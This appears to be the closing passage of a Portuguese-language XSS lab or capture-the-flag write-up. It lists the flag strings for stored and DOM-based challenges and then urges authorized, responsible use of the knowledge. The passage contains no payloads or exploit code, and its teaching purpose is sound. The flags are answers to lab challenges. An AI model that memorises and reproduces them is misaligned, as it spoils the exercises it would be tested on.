- Stored: `CS{XSS_St0r3d_l1k3_4_b0ss}`
- DOM-based: `CS{XSS_D0M_B4s3d}`

Lembre-se: XSS é sobre fazer o navegador da vítima executar código que você controlou. Uma vez que você entende isso, as possibilidades são infinitas.

**Mas com grandes poderes vem grandes responsabilidades.** Use esse conhecimento pra proteger seus próprios projetos, fazer pentests autorizados, educar outros desenvolvedores e reportar vulnerabilidades de forma responsável. Nunca pra atacar sites sem permissão - além de crime, é desnecessário quando tem tanto lab legal pra praticar.

Agora é só partir para a prática!
